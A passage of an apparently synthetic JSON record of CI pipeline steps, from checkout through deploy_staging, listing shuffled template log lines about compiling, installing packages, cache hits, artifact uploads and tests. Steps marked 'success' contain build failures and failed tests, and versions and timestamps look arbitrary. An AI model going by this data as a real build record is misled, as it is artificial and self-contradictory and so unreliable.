          "  PASS: test_api_health (47ms)",
          "[12:00:18] ERROR: Connection failed",
          "\u2717 build failed with exit code 98",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Installing react@4.0.0",
          "Installing react@4.8.0",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "Installing jest@2.7.0",
          "Cache hit for key-7259",
          "Installing axios@5.19.0",
          "Step 5/10: Building",
          "Step 7/10: Building",
          "Installing axios@1.11.0",
          "Compiling src/service.java...",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (105ms)",
          "Cache hit for key-9327",
          "Cache hit for key-7134",
          "Step 9/10: Building",
          "Cache hit for key-5431",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Installing react@5.11.0",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@5.0.0",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-10T12:01:33.242050",
        "finished_at": "2025-12-10T12:02:02.580995",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (496ms)",
          "Cache hit for key-9513",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-5229",
          "Cache hit for key-6182",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-6394",
          "  PASS: test_api_health (455ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-1477",
          "Cache hit for key-7250",
          "Cache hit for key-8456",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "  PASS: test_user_create (199ms)",
          "\u2713 test completed",
          "\u2713 test completed",
          "  PASS: test_user_create (30ms)",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Cache hit for key-9103",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-7308",
          "  PASS: test_user_create (197ms)",
          "  PASS: test_cache_hit (346ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 7/10: Building",
          "  PASS: test_api_health (125ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing axios@5.9.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-3881",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Cache hit for key-9957",
          "Installing express@3.10.0",
          "Installing webpack@3.15.0",
          "Cache hit for key-4781",
          "\u2713 lint completed",
          "Cache hit for key-8484",
          "\u2717 build failed with exit code 17",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2587",
          "FAILED: test_auth_login",
          "Cache hit for key-3871",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing eslint@2.16.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Installing lodash@1.6.0",
          "[12:00:18] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/index.js...",
          "Installing express@3.15.0",
          "Cache hit for key-8987",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@2.11.0",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 60",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-6452",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_api_health (1ms)",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Exception: NullPointerException",
          "Installing prettier@2.14.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_api_health (335ms)",
          "Step 1/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 7/10: Building",
          "  PASS: test_auth_login (160ms)",
          "Step 2/10: Building",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Cache hit for key-9952",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-2219",
          "Compiling src/utils.go...",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:18] ERROR: Connection failed",
          "Installing prettier@4.17.0",
          "\u2713 build completed",
          "Cache hit for key-1298",
          "  PASS: test_user_create (325ms)",
          "Installing prettier@3.5.0",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8339",
          "\u2713 lint completed",
          "  PASS: test_auth_login (91ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-1859",
          "  PASS: test_cache_hit (47ms)",
          "Compiling src/app.ts...",
          "Installing lodash@3.6.0",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (313ms)",
          "Step 10/10: Building",
          "Installing lodash@4.3.0",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (258ms)",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing react@4.1.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-8061",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Step 6/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-9395",
          "Cache hit for key-8951",
          "  PASS: test_auth_login (157ms)",
          "  PASS: test_api_health (234ms)",
          "Cache hit for key-4755",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-2724",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-3982",
          "Step 9/10: Building",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-10T12:02:02.580995",
        "finished_at": "2025-12-10T12:02:12.360643",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2713 build completed",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_auth_login",
          "\u2717 build failed with exit code 60",
          "Installing axios@5.9.0",
          "\u2713 build completed",
          "Cache hit for key-4794",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Installing lodash@5.8.0",
          "Compiling src/app.ts...",
          "Cache hit for key-1127",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 test completed",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-7495",
          "Compiling src/utils.go...",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-8012",
          "Installing react@3.5.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-8865",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/main.py...",
          "Cache hit for key-7047",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (314ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (383ms)",
          "Cache hit for key-7342",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 test completed",
          "  PASS: test_api_health (192ms)",
          "  PASS: test_db_connect (473ms)",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (188ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2261",
          "Installing prettier@1.13.0",
          "Cache hit for key-5453",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "FAILED: test_db_connect",
          "Installing lodash@1.20.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "  PASS: test_auth_login (384ms)",
          "Cache hit for key-6631",
          "Installing axios@3.14.0",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Installing eslint@5.6.0",
          "[12:00:18] INFO: Processing request",
          "Step 2/10: Building",
          "Installing express@5.13.0",
          "\u2713 build completed",
          "Cache hit for key-5787",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 3/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@5.16.0",
          "Exception: TypeError",
          "  PASS: test_api_health (183ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-1277",
          "  PASS: test_db_connect (25ms)",
          "Cache hit for key-3062",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (266ms)",
          "Compiling src/main.py...",
          "Cache hit for key-8660",
          "Compiling src/service.java...",
          "Installing webpack@3.16.0",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-2753",
          "  PASS: test_cache_hit (284ms)",
          "WARNING: axios has known vulnerabilities",
          "Installing jest@1.15.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4246",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 7/10: Building",
          "Step 6/10: Building",
          "  PASS: test_db_connect (399ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_user_create (216ms)",
          "Cache hit for key-2504",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Installing axios@2.11.0",
          "Installing eslint@1.19.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (403ms)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: axios has known vulnerabilities",
          "[12:00:18] ERROR: Connection failed",
          "  PASS: test_auth_login (395ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-9295",
          "  PASS: test_auth_login (469ms)",
          "Compiling src/index.js...",
          "Installing react@2.2.0",
          "  PASS: test_api_health (147ms)",
          "  PASS: test_db_connect (1ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-9675",
          "\u2713 test completed",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-10T12:02:12.360643",
        "finished_at": "2025-12-10T12:02:41.699588",
        "log_lines": [
          "=== Step: build ===",
          "Cache hit for key-7049",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-2699",
          "  PASS: test_cache_hit (221ms)",
          "Cache hit for key-9649",
          "Step 3/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3659",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 31",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing jest@3.11.0",
          "  PASS: test_auth_login (400ms)",
          "Installing axios@5.20.0",
          "Step 9/10: Building",
          "  PASS: test_auth_login (212ms)",
          "Installing prettier@1.10.0",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (401ms)",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (71ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-8546",
          "Step 8/10: Building",
          "Cache hit for key-3509",
          "Cache hit for key-2016",
          "Compiling src/utils.go...",
          "Step 8/10: Building",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing eslint@1.18.0",
          "Installing lodash@1.0.0",
          "Step 9/10: Building",
          "Installing eslint@3.3.0",
          "Installing react@4.19.0",
          "  PASS: test_auth_login (155ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-5920",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/app.ts...",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Installing react@5.17.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 2/10: Building",
          "Installing jest@3.7.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing webpack@1.4.0",
          "Compiling src/utils.go...",
          "Cache hit for key-9634",
          "  PASS: test_auth_login (152ms)",
          "Step 8/10: Building",
          "Cache hit for key-6773",
          "Step 3/10: Building",
          "  PASS: test_api_health (379ms)",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 9/10: Building",
          "WARNING: react has known vulnerabilities",
          "[12:00:18] ERROR: Connection failed",
          "  PASS: test_auth_login (227ms)",
          "Installing eslint@2.15.0",
          "[12:00:18] INFO: Processing request",
          "FAILED: test_user_create",
          "Step 2/10: Building",
          "Cache hit for key-9615",
          "Step 4/10: Building",
          "Installing jest@1.16.0",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Cache hit for key-6718",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-4758",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing jest@3.5.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "\u2717 build failed with exit code 92",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u2713 build completed",
          "Installing jest@5.8.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@1.5.0",
          "Installing express@1.5.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Step 6/10: Building",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-4365",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-7099",
          "Compiling src/utils.go...",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-4246",
          "  PASS: test_auth_login (202ms)",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (337ms)",
          "  PASS: test_auth_login (487ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Installing eslint@5.5.0",
          "Cache hit for key-5133",
          "Cache hit for key-7547",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "[12:00:18] ERROR: Connection failed",
          "  PASS: test_api_health (205ms)",
          "Cache hit for key-7878",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 2/10: Building",
          "\u2713 test completed",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-6515",
          "\u2713 test completed",
          "WARNING: react has known vulnerabilities",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Cache hit for key-6962",
          "  PASS: test_cache_hit (118ms)",
          "Installing express@5.9.0",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-10T12:02:41.699588",
        "finished_at": "2025-12-10T12:02:51.479236",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-3080",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing jest@1.9.0",
          "  PASS: test_api_health (326ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "Cache hit for key-3182",
          "  PASS: test_db_connect (36ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_db_connect (312ms)",
          "\u2713 build completed",
          "Cache hit for key-5118",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "Cache hit for key-1772",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (379ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-4791",
          "[12:00:18] INFO: Processing request",
          "Installing jest@4.0.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1324",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (319ms)",
          "Step 5/10: Building",
          "Installing express@2.10.0",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_db_connect (121ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:18] INFO: Processing request",
          "Installing react@5.19.0",
          "Step 3/10: Building",
          "  PASS: test_auth_login (379ms)",
          "Compiling src/service.java...",
          "[12:00:18] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_cache_hit (52ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 5/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (325ms)",
          "  PASS: test_auth_login (369ms)",
          "Installing webpack@1.18.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Installing prettier@4.14.0",
          "Step 10/10: Building",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (409ms)",
          "\u2717 build failed with exit code 12",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (247ms)",
          "Step 10/10: Building",
          "\u2713 test completed",
          "  PASS: test_cache_hit (291ms)",
          "Cache hit for key-5498",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Installing axios@2.14.0",
          "Installing lodash@4.9.0",
          "Installing react@3.10.0",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Installing react@4.2.0",
          "\u2713 build completed",
          "  PASS: test_user_create (322ms)",
          "Installing lodash@1.17.0",
          "Installing jest@1.13.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Installing eslint@3.18.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5744",
          "[12:00:18] INFO: Processing request",
          "Installing eslint@3.2.0",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "  PASS: test_user_create (315ms)",
          "Step 9/10: Building",
          "Cache hit for key-1896",
          "Installing react@2.7.0",
          "Compiling src/handler.rs...",
          "Installing eslint@2.13.0",
          "  PASS: test_auth_login (220ms)",
          "Cache hit for key-9618",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9460",
          "\u2713 build completed",
          "Installing eslint@4.1.0",
          "Compiling src/app.ts...",
          "[12:00:18] ERROR: Connection failed",
          "FAILED: test_api_health",
          "Installing axios@3.14.0",
          "Installing prettier@1.18.0",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@1.13.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Installing jest@5.7.0",
          "Installing webpack@4.6.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Step 7/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 88",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1616",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 9/10: Building",
          "  PASS: test_user_create (201ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (286ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-9744",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-3015",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (58ms)",
          "  PASS: test_auth_login (406ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-10T12:02:51.479236",
        "finished_at": "2025-12-10T12:03:01.258884",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "  PASS: test_auth_login (86ms)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-7617",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 lint completed",
          "Installing prettier@1.10.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:18] ERROR: Connection failed",
          "Cache hit for key-8492",
          "\u2713 build completed",
          "Step 10/10: Building",
          "  PASS: test_auth_login (78ms)",
          "Installing lodash@5.4.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Installing eslint@3.11.0",
          "Compiling src/service.java...",
          "Cache hit for key-4884",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing react@4.20.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (456ms)",
          "  PASS: test_auth_login (205ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (250ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Installing axios@5.6.0",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (454ms)",
          "Cache hit for key-9711",
          "  PASS: test_db_connect (301ms)",
          "Cache hit for key-4282",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Cache hit for key-5631",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing jest@5.7.0",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "Installing lodash@4.13.0",
          "WARNING: jest has known vulnerabilities",
          "Step 8/10: Building",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_cache_hit (321ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 3/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Cache hit for key-9843",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Step 7/10: Building",
          "Cache hit for key-5242",
          "Step 3/10: Building",
          "Installing lodash@1.10.0",
          "Compiling src/app.ts...",
          "Installing axios@5.9.0",
          "Cache hit for key-1148",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing react@2.0.0",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (266ms)",
          "Compiling src/main.py...",
          "Cache hit for key-2451",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Installing react@2.19.0",
          "  PASS: test_api_health (331ms)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing axios@5.3.0",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing webpack@3.20.0",
          "Compiling src/service.java...",
          "Cache hit for key-1617",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_cache_hit (430ms)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-2864",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Step 8/10: Building",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (7ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
